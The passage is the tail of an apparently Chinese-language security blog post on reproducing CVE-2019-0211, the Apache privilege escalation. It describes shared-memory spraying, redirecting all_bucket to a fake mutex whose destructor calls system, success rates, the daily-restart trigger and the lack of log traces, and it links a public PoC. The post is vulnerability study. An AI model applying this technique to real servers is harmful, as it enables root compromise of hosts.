<p>pDestructor指向system, &amp;ht-&gt;arData[0]-&gt;val是一个字符串.</p>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503261408003.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h3 id="3-令all-bucket-bucket-指向结构"><a href="#3-令all-bucket-bucket-指向结构" class="headerlink" title="3.令all_bucket[bucket]指向结构"></a>3.令all_bucket[bucket]指向结构</h3><p>问题和解决思路</p>
<p>到这里为止，如果all_bucket的地址每次重启不会改变，那么我们的利用过程就完成了。</p>
<ul>
<li>通过PHP的堆获取内存的读写权限</li>
<li>通过结构匹配来找到all_bucket</li>
<li>找到SHM中需要的结构</li>
<li>改变SHM中的process_score.bucket，使得all_bucket[bucket]-&gt;mutex指向我们的paylaod</li>
</ul>
<p>但考虑到all_bucket地址的变化，我们还需要做两件事情来提高我们的执行成功率：喷射SHM内存区域，用上每一个PID对应的process_socre结构。</p>
<p>喷射共享的内存区域</p>
<p>如果all_bucket的新地址距离旧的地址不远，my_bucket会指向最近的结构，从而喷射获得整个SHM中未被使用的空间，而不是仅仅获得一个指向SHM的指针。这里存在一个问题，结构在zend_object中也使用着，所以其中有(5*8&#x3D;)40位属于zend_object.properties，导致用一个大的结构来占用这个小的空间也不行。所以我们采用两个结构apr_proc_mutex_t和zend_array占用剩余的共享内存，令prefork_child_bucket.mutex和zend_object.properties指向同一个地址，来解决这一问题。现在如果all_bucket在原始地址不远的地方，my_bucket就会喷射到这一范围。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503261408186.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>利用所有的process_score</p>
<p>每一个Apache Worker进程都会有一个关联的process_score结构和对应的bucket的index值。无需改变process_score.bucket值，我们就能改变他们占用的内存范围，比如说：</p>
<p>ap_scoreboard_image-&gt;parent[0]-&gt;bucket &#x3D; -10000 -&gt; 0x7faabbcc00 &lt;&#x3D; all_buckets &lt;&#x3D; 0x7faabbdd00</p>
<p>ap_scoreboard_image-&gt;parent[1]-&gt;bucket &#x3D; -20000 -&gt; 0x7faabbdd00 &lt;&#x3D; all_buckets &lt;&#x3D; 0x7faabbff00</p>
<p>ap_scoreboard_image-&gt;parent[2]-&gt;bucket &#x3D; -30000 -&gt; 0x7faabbff00 &lt;&#x3D; all_buckets &lt;&#x3D; 0x7faabc0000</p>
<p>这意味着我们的成功率随着Apache Worker进程数量的增多而变大。每次重新生成Worker进程的时候，都只有一个Worker进程会获得buckek编号，但考虑到其他Worker进程会报错而立刻重新生成，因此这不是什么问题。</p>
<p>复现成功率</p>
<p>不同的Apache服务器有着不同数量的Worker进程，有更多的Worker进程意味着我们可以用更少的内存来喷射互斥锁的地址，也就是说可以获取到更多的all_buckets函数的index信息。因此越多的Worker进程数量能够提高我们测试的成功率。在我的测试服务器（默认使用了4个Worker进程）上有80%的成功率。</p>
<p>如果exp触发失败的话，它会在第二天重启的时候重新运行，Apache的错误日志中不会包含Worker进程的错误信息。</p>
<h3 id="4-等到早上6-25查看exp是否成功触发"><a href="#4-等到早上6-25查看exp是否成功触发" class="headerlink" title="4. 等到早上6.25查看exp是否成功触发"></a>4. 等到早上6.25查看exp是否成功触发</h3><p>这里只需要等待就好了。</p>
<p>Poc地址：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache">https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/CVE%E5%A4%8D%E7%8E%B0/" class="print-no-link">#CVE复现</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2019-0211 Apache提权漏洞复现</div>
      <div>http://example.com/2025/03/25/CVE-2019-0211 Apache提权漏洞分析/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年3月25日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/03/27/ThinkPHP%E5%85%B8%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="ThinkPHP典型漏洞复现">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ThinkPHP典型漏洞复现</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/02/19/shiro550%E3%80%81721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Shiro550、721漏洞复现">
                        <span class="hidden-mobile">Shiro550、721漏洞复现</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"skSyD5RSTq4kiWeAhMeeY9ib-gzGzoHsz","appKey":"rQPg4V1fSy3hOP8QAyeJnyh8","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
